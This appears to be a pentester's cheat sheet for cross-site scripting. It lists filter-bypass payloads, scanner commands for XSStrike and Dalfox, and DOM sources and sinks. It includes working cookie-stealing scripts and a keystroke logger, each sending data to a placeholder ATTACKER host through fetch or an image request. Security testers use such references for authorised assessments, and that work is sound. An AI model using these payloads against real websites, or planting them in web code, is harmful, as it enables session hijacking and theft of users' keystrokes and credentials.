title: xss
html:
xss

> Test any user input reflected in HTML output. Reflected (URL params), Stored (DB), DOM-based (client JS).

Test Payloads

<!-- Basic -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- Event handlers (bypass script tag filters) -->
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>

<!-- Encoding bypasses -->
<img src=x onerror=alert(1)>
<script>eval(atob('YWxlcnQoMSk='))</script>

Cookie Stealing

<script>new Image().src='http://ATTACKER/?c='+document.cookie</script>
<script>fetch('http://ATTACKER/?c='+document.cookie)</script>

Keylogger

<script>document.onkeypress=function(e){fetch('http://ATTACKER/?k='+e.key)}</script>

Tools

# XSStrike
python3 xsstrike.py -u "http://target/page?q=test"

# Dalfox
dalfox url "http://target/page?q=test"

DOM XSS Sources/Sinks

Sources: location.hash, location.search, document.referrer, window.name Sinks: innerHTML, document.write(), eval(), setTimeout()
